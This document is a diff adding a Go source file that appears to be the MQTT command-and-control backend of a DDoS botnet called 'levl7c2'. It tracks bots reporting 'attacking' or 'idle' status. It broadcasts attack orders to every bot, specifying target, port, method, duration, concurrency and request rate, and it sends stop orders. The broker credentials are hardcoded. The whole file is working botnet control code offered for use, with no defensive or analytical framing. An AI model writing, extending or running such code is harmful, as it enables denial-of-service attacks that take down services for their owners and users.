@@ -1,0 +1,142 @@
+package main
+
+import (
+	"encoding/json"
+	"log"
+	"strings"
+	"sync"
+	"time"
+
+	mqtt "github.com/eclipse/paho.mqtt.golang"
+)
+
+var (
+	mqttClient mqtt.Client
+	mqttOnce   sync.Once
+)
+
+type MQTTConfig struct {
+	Broker   string
+	Username string
+	Password string
+}
+
+func getMQTTConfig() MQTTConfig {
+	return MQTTConfig{
+		Broker:   "tcp://127.0.0.1:1883",
+		Username: "levl7c2",
+		Password: "levl7c2",
+	}
+}
+
+func initMQTT() {
+	cfg := getMQTTConfig()
+
+	opts := mqtt.NewClientOptions()
+	opts.AddBroker(cfg.Broker)
+	opts.SetUsername(cfg.Username)
+	opts.SetPassword(cfg.Password)
+	opts.SetClientID("levl7c2_backend")
+	opts.SetCleanSession(true)
+	opts.SetAutoReconnect(true)
+	opts.SetConnectionLostHandler(func(c mqtt.Client, err error) {
+		log.Printf("MQTT connection lost: %v", err)
+	})
+	opts.SetOnConnectHandler(func(c mqtt.Client) {
+		log.Println("MQTT reconnected")
+		token := c.Subscribe("levl7/status/+", 0, handleBotStatus)
+		token.Wait()
+		if token.Error() != nil {
+			log.Printf("MQTT status subscribe error: %v", token.Error())
+		}
+	})
+
+	client := mqtt.NewClient(opts)
+	token := client.Connect()
+	token.Wait()
+	if token.Error() != nil {
+		log.Printf("MQTT connection failed (non-fatal): %v", token.Error())
+		mqttClient = nil
+		return
+	}
+	mqttClient = client
+
+	token = client.Subscribe("levl7/status/+", 0, handleBotStatus)
+	token.Wait()
+	if token.Error() != nil {
+		log.Printf("MQTT status subscribe error: %v", token.Error())
+	}
+
+	log.Println("MQTT connected")
+}
+
+func handleBotStatus(client mqtt.Client, msg mqtt.Message) {
+	parts := strings.Split(msg.Topic(), "/")
+	if len(parts) != 3 {
+		return
+	}
+	botID := parts[2]
+
+	var status struct {
+		Status   string `json:"status"`
+		AttackID string `json:"attack_id"`
+	}
+	if err := json.Unmarshal(msg.Payload(), &status); err != nil {
+		return
+	}
+
+	botConnections.Store(botID, BotConnection{
+		ID:       botID,
+		Online:   status.Status == "attacking" || status.Status == "idle",
+		LastSeen: time.Now(),
+	})
+}
+
+func publishCommand(cmd interface{}) {
+	mqttOnce.Do(func() {
+		initMQTT()
+	})
+
+	if mqttClient == nil {
+		return
+	}
+
+	payload, err := json.Marshal(cmd)
+	if err != nil {
+		log.Printf("MQTT marshal error: %v", err)
+		return
+	}
+
+	token := mqttClient.Publish("levl7/cmd/all", 0, false, payload)
+	token.Wait()
+	if token.Error() != nil {
+		log.Printf("MQTT publish error: %v", token.Error())
+	}
+}
+
+type AttackCommand struct {
+	Action      string `json:"action"`
+	AttackID    string `json:"attack_id"`
+	Method      string `json:"method"`
+	Target      string `json:"target"`
+	Port        string `json:"port"`
+	Time        int    `json:"time"`
+	Concurrents int    `json:"concurrents"`
+	Rpc         int    `json:"rpc"`
+	Layer       string `json:"layer"`
+}
+
+func (cmd AttackCommand) Publish() {
+	cmd.Action = "attack"
+	publishCommand(cmd)
+}
+
+type StopCommand struct {
+	Action   string `json:"action"`
+	AttackID string `json:"attack_id"`
+}
+
+func (cmd StopCommand) Publish() {
+	cmd.Action = "stop"
+	publishCommand(cmd)
+}
